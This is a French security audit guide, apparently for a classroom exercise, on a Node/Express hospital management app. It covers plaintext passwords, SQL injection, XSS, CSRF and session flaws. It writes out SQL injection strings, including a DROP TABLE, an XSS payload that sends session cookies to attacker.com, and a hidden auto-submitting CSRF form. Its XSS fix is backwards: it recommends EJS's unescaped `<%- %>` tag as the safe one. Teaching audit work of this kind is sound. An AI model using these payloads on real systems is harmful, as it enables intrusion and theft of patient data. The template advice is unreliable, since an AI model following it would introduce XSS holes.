# Audit de Sécurité - Système de Gestion Hospitalière

Ce document présente un audit des vulnérabilités de sécurité présentes dans l'application de gestion hospitalière. Il est destiné à servir de guide pour la détection des failles de sécurité et leur remédiation dans le cadre d'un exercice académique.

## Table des Matières

1. [Déploiement avec Certificat TLS](#déploiement-avec-certificat-tls)
2. [Vulnérabilités d'Authentification](#vulnérabilités-dauthentification)
3. [Injections SQL](#injections-sql)
4. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
5. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
6. [Exposition de Données Sensibles](#exposition-de-données-sensibles)
7. [Mauvaise Configuration de Sécurité](#mauvaise-configuration-de-sécurité)
8. [Gestion des Sessions](#gestion-des-sessions)
9. [Validation des Entrées Insuffisante](#validation-des-entrées-insuffisante)
10. [Méthodologie d'Audit](#méthodologie-daudit)
11. [Outils de Test](#outils-de-test)

## Déploiement avec Certificat TLS

### Configuration avec Let's Encrypt

Pour déployer l'application avec un certificat TLS valide :

1. Installez Certbot : `sudo apt-get install certbot`
2. Obtenez un certificat : `sudo certbot certonly --standalone -d votredomaine.com`
3. Configurez Express pour utiliser HTTPS :

```javascript
const https = require('https');
const fs = require('fs');

const privateKey = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/privkey.pem', 'utf8');
const certificate = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/cert.pem', 'utf8');
const ca = fs.readFileSync('/etc/letsencrypt/live/votredomaine.com/chain.pem', 'utf8');

const credentials = {
    key: privateKey,
    cert: certificate,
    ca: ca
};

const httpsServer = https.createServer(credentials, app);
httpsServer.listen(443, () => {
    console.log('HTTPS Server running on port 443');
});
```

### Configuration avec un Certificat Auto-signé (pour tests)

```javascript
const https = require('https');
const fs = require('fs');
const { exec } = require('child_process');

// Générer un certificat auto-signé
exec('openssl req -nodes -new -x509 -keyout server.key -out server.cert -days 365 -subj "/CN=localhost"', (error, stdout, stderr) => {
    if (error) {
        console.error(`Erreur lors de la génération du certificat: ${error}`);
        return;
    }
    
    const privateKey = fs.readFileSync('server.key', 'utf8');
    const certificate = fs.readFileSync('server.cert', 'utf8');
    
    const credentials = {
        key: privateKey,
        cert: certificate
    };
    
    const httpsServer = https.createServer(credentials, app);
    httpsServer.listen(443, () => {
        console.log('HTTPS Server running on port 443');
    });
});
```

## Vulnérabilités d'Authentification

### 1. Stockage de Mots de Passe en Clair

**Localisation** : `models/db_controller.js` et `controllers/login.js`

**Description** : Les mots de passe utilisateur sont stockés en texte clair dans la base de données, ce qui constitue une violation grave des bonnes pratiques de sécurité.

**Exploitation** :
1. Un attaquant ayant accès à la base de données peut directement lire les mots de passe de tous les utilisateurs
2. Si un utilisateur utilise le même mot de passe sur plusieurs sites, l'attaquant peut accéder à ses autres comptes

**Code Vulnérable** :
```javascript
// models/db_controller.js - fonction signup
var signup = function(username, email, password, consent, token, status, callback) {
    var query = "INSERT INTO `verification`(`username`, `email`, `password`, `consent`, `token`, `status`) VALUES ('" + username + "','" + email + "','" + password + "','" + consent + "','" + token + "', '" + status + "')";
    connection.query(query, callback);
}

// controllers/login.js - vérification du mot de passe
var query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";
```

**Remédiation** :
1. Utiliser bcrypt pour hacher les mots de passe avant stockage
2. Ne jamais stocker les mots de passe en clair
3. Toujours vérifier les mots de passe en comparant leur hachage
4. Implémenter une politique de complexité des mots de passe

### 2. Absence de Protection Contre les Attaques par Force Brute

**Localisation** : `controllers/login.js`

**Description** : L'application ne limite pas le nombre de tentatives de connexion infructueuses, ce qui permet à un attaquant de tenter un nombre illimité de combinaisons de mots de passe.

**Exploitation** :
1. Un script automatisé peut essayer des milliers de combinaisons de mots de passe
2. Des attaques de dictionnaire ou rainbow tables peuvent être utilisées

**Remédiation** :
1. Implémenter une limitation de taux (rate limiting) pour les tentatives de connexion
2. Verrouiller temporairement les comptes après un certain nombre d'échecs
3. Ajouter des délais croissants entre les tentatives

### 3. Énumération des Noms d'Utilisateur

**Localisation** : `controllers/login.js`

**Description** : L'application retourne des messages d'erreur différents selon que le nom d'utilisateur existe ou non, ce qui permet à un attaquant de découvrir des noms d'utilisateur valides.

**Exploitation** :
1. Un attaquant peut essayer différents noms d'utilisateur et détecter lesquels existent
2. Cela réduit considérablement l'espace de recherche pour une attaque par force brute

**Code Vulnérable** :
```javascript
if (rows.length == 0) {
    req.flash('danger', username + ' is not registered');
    res.redirect('/login');
    return;
}
```

**Remédiation** :
1. Utiliser des messages d'erreur génériques (ex: "Identifiants incorrects")
2. Maintenir un temps de réponse constant que l'utilisateur existe ou non

## Injections SQL

### 1. Concaténation Directe de Variables dans les Requêtes SQL

**Localisation** : `models/db_controller.js` (dans toutes les fonctions)

**Description** : L'application construit les requêtes SQL en concaténant directement les entrées utilisateur, ce qui permet des injections SQL.

**Exploitation** :
1. Un attaquant peut entrer `' OR '1'='1` comme nom d'utilisateur pour contourner l'authentification
2. Il peut exécuter des requêtes arbitraires comme `'; DROP TABLE users; --`
3. Il peut lire, modifier ou supprimer des données sans autorisation

**Code Vulnérable** :
```javascript
// Requête pour l'authentification
var query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'";

// Requête pour la recherche
var query = "SELECT * FROM medicine WHERE name LIKE '%" + search + "%'";
```

**Requêtes SQL Malveillantes** :
```sql
-- Authentification bypass
' OR '1'='1

-- Extraction de données
' UNION SELECT username, password, email FROM users; --

-- Suppression de données
'; DROP TABLE appointments; --
```

**Remédiation** :
1. Utiliser des requêtes paramétrées
2. Utiliser des ORM qui échappent automatiquement les entrées
3. Valider et assainir toutes les entrées utilisateur

**Code Sécurisé** :
```javascript
var query = "SELECT * FROM users WHERE username = ? AND password = ?";
connection.query(query, [username, password], callback);
```

## Cross-Site Scripting (XSS)

### 1. Affichage Non Sécurisé des Données Utilisateur

**Localisation** : La plupart des fichiers .ejs, notamment `views/appointment.ejs`, `views/doctors.ejs`, etc.

**Description** : L'application affiche les données utilisateur sans échappement approprié, permettant l'injection de scripts.

**Exploitation** :
1. Un attaquant peut insérer du code JavaScript dans les champs de formulaire
2. Lorsque ces données sont affichées à d'autres utilisateurs, le script s'exécute
3. Le script peut voler des cookies de session, rediriger vers des sites malveillants, etc.

**Code Vulnérable** :
```ejs
<div class="message-author"><%= message.author %></div>
<div class="patient-name"><%= patient.name %></div>
```

**Payload XSS** :
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
<img src="x" onerror="alert(document.cookie)">
```

**Remédiation** :
1. Utiliser le filtrage automatique d'EJS avec `<%- ... %>` au lieu de `<%= ... %>`
2. Implémenter une Content Security Policy (CSP)
3. Échapper manuellement les données avant affichage

## Cross-Site Request Forgery (CSRF)

### 1. Absence de Protection CSRF

**Localisation** : Tous les formulaires et requêtes POST (`views/add_appointment.ejs`, `views/add_doctor.ejs`, etc.)

**Description** : L'application ne vérifie pas que les requêtes POST proviennent d'utilisateurs légitimes, permettant à un attaquant de forcer un utilisateur à effectuer des actions à son insu.

**Exploitation** :
1. L'attaquant crée une page web contenant un formulaire qui soumet automatiquement une requête à l'application cible
2. Lorsqu'un utilisateur authentifié visite cette page, l'action s'exécute avec ses privilèges

**Code Vulnérable** :
```html
<form action="/store/add_med" method="POST">
    <input type="text" name="name" value="Medicament">
    <input type="text" name="price" value="100">
    <input type="submit" value="Ajouter">
</form>
```

**Attaque CSRF** :
```html
<img src="x" onerror="document.getElementById('csrf-form').submit()">
<form id="csrf-form" action="http://hospital-app.com/store/add_med" method="POST" style="display:none">
    <input type="text" name="name" value="Medicament Malveillant">
    <input type="text" name="price" value="999">
</form>
```

**Remédiation** :
1. Implémenter des tokens CSRF pour chaque formulaire
2. Vérifier le header Referer pour les requêtes sensibles
3. Utiliser le package csurf pour Express

## Exposition de Données Sensibles

### 1. Données Médicales Non Chiffrées

**Localisation** : Base de données et transmissions

**Description** : Les données médicales sensibles sont stockées et transmises sans chiffrement approprié.

**Exploitation** :
1. Un attaquant ayant accès à la base de données peut voir les informations médicales confidentielles
2. Les interceptions de trafic réseau peuvent révéler des données médicales

**Remédiation** :
1. Chiffrer les données sensibles au repos (dans la base de données)
2. Utiliser HTTPS pour toutes les communications
3. Implémenter un contrôle d'accès strict aux données sensibles

### 2. Informations de Diagnostic dans les Erreurs

**Localisation** : Throughout the application, no custom error handling

**Description** : L'application renvoie des traces d'erreur détaillées aux utilisateurs, révélant des informations internes.

**Exploitation** :
1. Les messages d'erreur peuvent révéler des chemins de fichiers, des versions de logiciels
2. Ces informations facilitent d'autres types d'attaques

**Remédiation** :
1. Implémenter une gestion d'erreur personnalisée
2. Journaliser les erreurs en interne mais afficher des messages génériques aux utilisateurs
3. Créer des pages d'erreur 404 et 500 personnalisées

## Mauvaise Configuration de Sécurité

### 1. En-têtes HTTP de Sécurité Manquants

**Localisation** : `app.js`

**Description** : L'application n'inclut pas les en-têtes HTTP de sécurité essentiels.

**Exploitation** :
1. Absence de protection contre le clickjacking
2. Vulnérabilité aux attaques MIME-sniffing
3. Absence de Content Security Policy

**Remédiation** :
1. Implémenter Helmet.js pour gérer les en-têtes de sécurité
2. Ajouter manuellement les en-têtes essentiels

```javascript
// Ajouter ces en-têtes
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
```

### 2. Dépendances Obsolètes et Vulnérables

**Localisation** : `package.json`

**Description** : L'application utilise des bibliothèques obsolètes avec des vulnérabilités connues.

**Exploitation** :
1. Les attaquants peuvent exploiter des vulnérabilités connues dans ces bibliothèques
2. Ces vulnérabilités peuvent permettre l'exécution de code arbitraire, etc.

**Remédiation** :
1. Exécuter régulièrement `npm audit` pour identifier les vulnérabilités
2. Mettre à jour les dépendances vers les versions sécurisées
3. Implémenter une vérification automatique des dépendances dans le pipeline CI/CD

## Gestion des Sessions

### 1. Configuration de Session Non Sécurisée

**Localisation** : `app.js`

**Description** : La configuration des sessions ne suit pas les meilleures pratiques de sécurité.

**Exploitation** :
1. Session fixation : un attaquant peut forcer un utilisateur à utiliser un ID de session connu
2. Vol de session par accès au cookie
3. Réutilisation de session

**Code Vulnérable** :
```javascript
app.use(session({
    secret: 'secret',
    resave: true,
    saveUninitialized: true
}));
```

**Remédiation** :
1. Utiliser un secret fort et aléatoire
2. Configurer correctement les options de cookie (httpOnly, secure, sameSite)
3. Implémenter la rotation des sessions après l'authentification

```javascript
app.use(session({
    secret: process.env.SESSION_SECRET, // Secret stocké dans une variable d'environnement
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        secure: true, // Avec HTTPS
        sameSite: 'strict',
        maxAge: 3600000 // 1 heure
    }
}));
```

## Validation des Entrées Insuffisante

### 1. Absence de Validation des Entrées Utilisateur

**Localisation** : Toutes les routes de formulaire, par exemple dans `controllers/appointment.js`

**Description** : L'application ne valide pas correctement les entrées utilisateur avant traitement.

**Exploitation** :
1. Injection de données malformées
2. Bypass des contrôles d'accès
3. Manipulation des données métier

**Remédiation** :
1. Implémenter une validation côté serveur avec express-validator
2. Normaliser les données avant traitement
3. Utiliser des types stricts pour les données sensibles

## Méthodologie d'Audit

Pour réaliser un audit complet de l'application, suivez ces étapes :

1. **Analyse Statique du Code**
   - Examinez le code source pour les vulnérabilités
   - Utilisez des outils d'analyse statique comme SonarQube
   - Vérifiez les dépendances avec OWASP Dependency Check

2. **Analyse Dynamique**
   - Testez l'application en cours d'exécution
   - Utilisez des outils comme OWASP ZAP ou Burp Suite
   - Effectuez des tests d'intrusion manuels

3. **Tests de Sécurité Spécifiques**
   - Test d'injection SQL
   - Test de XSS
   - Test de CSRF
   - Test de gestion des sessions

4. **Documentation des Résultats**
   - Documentez chaque vulnérabilité trouvée
   - Évaluez le risque (CVSS)
   - Proposez des remédiations

## Outils de Test

### Outils d'Analyse Statique
- SonarQube
- ESLint avec règles de sécurité
- npm audit

### Outils de Test de Pénétration
- OWASP ZAP (Zed Attack Proxy)
- Burp Suite
- Metasploit

### Outils de Test Spécifiques
- SQLmap pour les injections SQL
- XSStrike pour les vulnérabilités XSS
- CSRF Tester

### Exemple de Test d'Injection SQL

Pour tester l'injection SQL dans le formulaire de connexion :

1. Interceptez la requête de connexion avec Burp Suite
2. Modifiez le paramètre username pour inclure : `' OR '1'='1`
3. Observez si vous pouvez vous connecter sans connaître le mot de passe

### Exemple de Test XSS

Pour tester le XSS dans le formulaire de message :

1. Soumettez le payload suivant dans un champ de texte : `<script>alert(document.cookie)</script>`
2. Vérifiez si une boîte d'alerte apparaît lors de l'affichage du message

---

Ce document servira de guide pour l'audit de sécurité de l'application de gestion hospitalière. Il identifie les principales vulnérabilités à rechercher, explique comment les exploiter et propose des solutions pour les corriger. Utilisez-le comme point de départ pour votre exercice académique de sécurité.